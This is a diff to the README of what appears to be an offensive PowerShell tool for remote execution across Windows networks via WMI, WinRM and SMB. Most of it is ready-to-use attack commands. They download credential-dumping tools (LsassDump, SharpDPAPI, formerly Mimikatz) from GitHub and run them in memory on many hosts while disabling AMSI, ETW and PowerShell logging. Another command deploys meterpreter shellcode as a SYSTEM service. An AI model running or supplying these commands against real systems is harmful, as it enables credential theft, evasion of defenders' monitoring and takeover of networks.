@@ -43,9 +43,9 @@ The execution method must be specified within the function `Invoke-PowerExec`:
 | Method          | Description                                                            |
 | --------------- | ---------------------------------------------------------------------- |
 | CimProcess      | Create process via WMI                                                 |
-| CimTask         | Create temporary scheduled task running as NT AUTHORITY\SYSTEM via WMI |
 | CimService      | Create temporary service running as NT AUTHORITY\SYSTEM via WMI        |
 | CimSubscription | Create temporary WMI event subscription (experimental)                 |
+| CimTask         | Create temporary scheduled task running as NT AUTHORITY\SYSTEM via WMI |
 | SmbService      | Create temporary service running as NT AUTHORITY\SYSTEM via SMB        |
 | WinRM           | Run powershell via Windows Remote Management                           |
 
@@ -56,20 +56,21 @@ The execution output is retrieved regardless of the method used.
 
 ## Examples
 
-Run a PowerShell script through WMI using a download cradle while bypassing AMSI and ETW :
+Run a PowerShell script through WinRM while bypassing AMSI, PowerShell Module Logging and Script Block Logging:
 
 ```
-PS C:\> $payload = New-PowerLoader -Type PoSh -FileUrl 'https://raw.githubusercontent.com/BC-SECURITY/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1' -ArgumentList 'Invoke-Mimikatz -DumpCreds' -Bypass AMSI,ETW
-PS C:\> Invoke-PowerExec -ComputerList 192.168.1.0/24 -ScriptBlock $payload -Method CimProcess -Protocol Wsman -Threads 10
+PS C:\> $payload = New-PowerLoader -Type PoSh -FileUrl 'https://raw.githubusercontent.com/tmenochet/PowerDump/master/LsassDump.ps1' -ArgumentList 'Invoke-LsassDump' -Bypass AMSI,PML,SBL
+PS C:\> Invoke-PowerExec -ScriptBlock $payload -Method WinRM -ComputerDomain ADATUM.CORP -ComputerFilter Servers -Threads 10
 ```
 
-Run a .NET assembly through WinRM while bypassing AMSI, PowerShell Module Logging and Script Block Logging :
+Run a .NET assembly through WinRM while bypassing AMSI and ETW:
 
 ```
-PS C:\> New-PowerLoader -Type NetAsm -FilePath .\Seatbelt.exe -ArgumentList 'CredEnum' -Bypass AMSI,PML,SBL | Invoke-PowerExec -ComputerList 192.168.1.1,192.168.1.2 -Method WinRM
+PS C:\> $payload = New-PowerLoader -Type NetAsm -FileUrl 'https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.5_x64/SharpDPAPI.exe' -ArgumentList 'machinecredentials' -Bypass ETW,AMSI
+PS C:\> Invoke-PowerExec -ScriptBlock $payload -Method CimProcess -Protocol Dcom -ComputerList 192.168.1.1,192.168.1.2
 ```
 
-Run a shellcode through a service :
+Run a shellcode through a service:
 
 ```
 PS C:\> New-PowerLoader -Type Shellcode -FilePath .\meterpreter.bin | Invoke-PowerExec -ComputerList 192.168.1.1 -Method CimService -Protocol Dcom
